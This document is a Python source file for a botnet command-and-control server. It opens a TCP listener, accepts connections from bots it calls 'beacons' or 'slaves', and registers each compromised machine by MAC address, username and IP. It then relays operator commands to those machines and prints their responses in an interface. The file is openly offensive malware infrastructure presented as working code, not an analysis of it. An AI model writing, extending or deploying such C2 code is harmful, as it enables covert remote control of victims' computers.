import queue
import socket
import logger
import threading
import json
import time

from collections import OrderedDict
from server_connection import ServerConnectionThread
from commands import CommandHandler
from interface import create_interface
from utils import wrap_response
from models.slave import Slave
from config import ServerConfig

logger = logger.get_logger(__name__)

class ServerThread(threading.Thread):
    """
    This thread starts a listeing server and waits for connections from beacons/bots.
    If a connection is made, a new thread is spawned which handles that particular connection.
    """
    def __init__(self, host, port, mqs, rq, slave2beacon):
        threading.Thread.__init__(self)
        logger.debug("Created Server Thread")

        self.host = host
        self.port = port
        self.message_queues = mqs
        self.response_queue = rq
        self.slave2beacon = slave2beacon
        
    def run(self):
        self.listen()

    def listen(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_address = (self.host, self.port)
        server.bind(server_address)
        server.listen(10) # Only 10 connections in the same time.

        logger.debug("Starting net listener on tcp://{0}:{1}".format(self.host, str(self.port)))
        self.response_queue.put(wrap_response("SYSTEM",
                                              "[+] Starting net listener on tcp://{0}:{1}".format(self.host, str(self.port))))

        while True:
            (client, client_address) = server.accept()    #start listening
            self.message_queues[client_address] = queue.Queue()
            slave_thread = ServerConnectionThread(client, client_address, self.slave2beacon, self.message_queues, self.response_queue) 
            slave_thread.start()

class BotnetC2(object):
    """
    This is the entrypoint point of the botnet 2C. 
    """
    def __init__(self, host="0.0.0.0", port=5000):
        self.host = host
        self.port = port
        
        self.message_queues = OrderedDict({'all': queue.Queue()})
        self.response_queue = queue.Queue()
        self.slave2beacon = OrderedDict() 

    def start(self):
        # Start Server Thread
        server_thread = ServerThread(self.host, self.port, self.message_queues, self.response_queue,
                                     self.slave2beacon)
        server_thread.start()

        # Create Interface
        command_interface = create_interface(CommandHandler, mqs=self.message_queues ,
                                             slave2beacon=self.slave2beacon, rq=self.response_queue)
        
        # Start Response Thread
        response_handler = ResponseHandler(self.response_queue, self.slave2beacon, command_interface)
        response_handler.start()

        # Start Interface Loop (Blocking)
        command_interface.main()

        
class ResponseHandler(threading.Thread):
    """
    This is a different thread which constantly consumes messages from the response queue.
    The response queue is essentially anything that it will be shown on the interface output
    Slave command responses, status responses etc. 
    """
    def __init__(self, response_queue, slave2beacon, cmd_interface):
        threading.Thread.__init__(self)
        self.response_queue = response_queue
        self.slave2beacon = slave2beacon
        self.cmd_interface = cmd_interface

    def get_slave_by_mac(self, mac_addr):
        return [slave for slave in self.slave2beacon.keys() if slave.mac_addr == mac_addr][0]

    def run(self):
        self.name = threading.current_thread().getName()

        logger.debug("Running response handler: Thread-ID {0}".format(self.name))

        # Wait until interface has been initialised
        while not hasattr(self.cmd_interface, "body"):
            time.sleep(0.1)

        while True:
            response = self.response_queue.get()
            logger.debug("Thread {0}: Received response: {1}".format(self.name, response))
            self.handle_response(response)

    def handle_response(self, response):
        try:
            message = json.loads(response["msg"])
            if "type" in message:
                if message['type'] == "new":
                    mac_addr = message['mac']
                    username = message['username']
                    ip = message['slave']['ip']
                    port = message['slave']['port']
                    slave = Slave(mac_addr=mac_addr, username=username, ip=ip, port=port)
                    self.slave2beacon[slave] = response["addr"]
                    logger.debug("Thread {0} received MAC: \"{1}\",  registering bot".format(self.name, mac_addr))
                    self.cmd_interface.print_text("[!] Session opened at {0}".format(ServerConfig.UI_BOT_IDENTIFIER(slave)))
                else:
                    cmd_response = message["response"].strip()
                    sender = ServerConfig.UI_BOT_IDENTIFIER(self.get_slave_by_mac(message["sender"]))
                    self.cmd_interface.print_text("[+] Response from {0}".format(sender))
                    self.cmd_interface.print_text(cmd_response, "cmd_response")
            else:
                self.cmd_interface.print_text("[+] Received message without 'type' field:")
                self.cmd_interface.print_text(message)
        except json.decoder.JSONDecodeError:
            logger.debug("Thread {0} response processing error: Response {1} is not JSON".format(self.name, response["msg"]))
            self.cmd_interface.print_text(response["msg"])


if __name__=="__main__":
    logger.debug("Launched botnet server python script")
    server = BotnetC2()
    server.start()